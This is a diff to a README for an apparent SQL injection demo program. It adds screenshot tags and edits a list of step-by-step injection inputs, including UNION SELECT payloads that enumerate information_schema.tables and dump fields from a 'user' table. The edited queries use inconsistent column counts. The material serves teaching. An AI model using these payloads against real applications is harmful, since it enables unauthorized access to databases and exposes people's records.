@@ -19,18 +19,39 @@ Steps to Implement this program:- ( For Windows users)
 
 7. Now, let's test sql injection:-
   
-  - Type " a' " in text field, if output is  showing a sql error then this page is sql injected 
+   Type " a' " in text field, if output is  showing a sql error then this page is sql injected 
     and can be hackable.
-  - Now type some queries given below:-
+    
+    <img src = "screenshots/Screenshot from 2019-10-03 00-17-35.png" height = 500 width  = 900/>
+    
+    Output:-
+    
+    <img src = "screenshots/Screenshot from 2019-10-03 00-17-59.png" height = 500 width  = 900/>
+    
+   Now type some queries given below:-
 
-   1. a' and 1=0 union select table_name, table_schema, table_type, table_catalog from information_schema.tables;#
+   1. a' and 1=0 union select table_schema, table_type, table_catalog from information_schema.tables;#
    
-   <img src = "screenshots/Screenshot from 2019-10-03 00-17-35.png"
+   <img src = "screenshots/Screenshot from 2019-10-03 00-29-45.png" height = 500 width  = 900/>
+   
+   Output:-
+     <img src = "screenshots/Screenshot from 2019-10-03 00-30-45.png" height = 500 width  = 900/>
 
-   2. a' and 1=0 union select table_name, table_schema, table_type, table_catalog from information_schema.tables 
+   2. a' and 1=0 union select table_schema, table_type, table_catalog from information_schema.tables 
       where table_name like 'user%';#
+      
+        <img src = "screenshots/Screenshot from 2019-10-03 00-31-57.png" height = 500 width  = 900/>
+        
+        Output:-
+          <img src = "screenshots/Screenshot from 2019-10-03 00-32-01.png" height = 500 width  = 900/>
+     
 
    3. a' and 1=0 union select concat_WS(':', name), concat_WS(':', srno, city), name, city from user;#
+   
+     <img src = "screenshots/Screenshot from 2019-10-03 00-34-12.png" height = 500 width  = 900/>
+     
+     Output:-
+      <img src = "screenshots/Screenshot from 2019-10-03 00-34-16.png" height = 500 width  = 900/>
 
 
 Steps to Implement this program:- ( For Linux users):-
